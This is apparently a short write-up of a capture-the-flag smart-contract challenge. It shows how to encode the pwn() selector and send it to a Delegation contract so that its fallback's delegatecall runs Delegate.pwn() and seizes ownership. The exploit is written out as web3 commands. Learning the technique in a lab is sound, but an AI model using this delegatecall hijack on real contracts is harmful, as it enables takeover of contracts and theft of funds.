## Steps:

First, we have to calculate the selector for the pwn() function.

> const selector = web3.eth.abi.encodeFunctionSignature("pwn()")

Second, we have to make the call to Delegation, but call pwn() as its function. This way, the fallback function is triggered, which then makes the delegate call to the function whose selector is in msg.data of the transaction. Thus, pwn() function of Delegate contract is called.

To make the call, we simply use sendTransaction like:

> await web3.eth.sendTransaction({from: player, to: contract.address, data: selector})
